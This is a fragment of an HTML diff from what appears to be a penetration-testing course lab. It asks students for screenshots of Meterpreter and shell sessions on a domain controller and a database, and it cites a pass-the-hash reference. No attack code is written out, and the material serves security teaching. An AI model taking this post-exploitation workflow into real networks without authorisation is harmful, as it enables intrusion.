+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">4.2</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Submit a screenshot showing all three sessions active. (The original shell to the domain controller, the Meterpreter shell to the domain controller, and the Meterpreter shell to the database).</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Submit a screenshot showing the output of <span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Use the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>sysinfo</strong></span> on the database.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- REFERENCES -->
+<blockquote>
+  <p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt; text-decoration: underline;"><strong>REFERENCES</strong></span></p>
+  <ul>
+    <li><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;"><a href="https://security.stackexchange.com/questions/141681/can-an-intruder-still-possibly-succeed-with-pass-the-hash-or-pass-the-ticket-on" target="_blank" rel="noopener"><span style="color: #ba372a;">https://security.stackexchange.com/questions/141681/can-an-intruder-still-possibly-succeed-with-pass-the-hash-or-pass-the-ticket-on</span></a></span></li>
+  </ul>
+</blockquote>
+<p></p>
+
+
+<!-- COPYRIGHT -->
+<a href="##top9" style="color: #ba372a;">[TOP]</a>
+<hr />
+<p style="text-align: center;">Copyright &copy; 2022-2025 Dr. Matthew Kisow. All Rights Reserved</p>
